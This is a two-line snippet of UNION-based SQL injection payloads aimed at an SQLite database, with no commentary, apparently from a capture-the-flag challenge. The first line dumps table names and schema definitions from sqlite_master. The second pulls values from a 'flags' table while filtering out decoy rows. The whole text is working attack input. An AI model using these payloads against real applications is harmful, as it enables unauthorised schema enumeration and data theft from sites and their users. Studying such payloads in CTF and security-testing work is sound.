' union SELECT name AS table_name,1,1, sql AS table_definition  FROM  sqlite_master  WHERE type ='table' AND  name NOT LIKE 'sqlite_%
' union SELECT flag,flag,flag,flag from flags where flag NOT LIKE 'not flag%

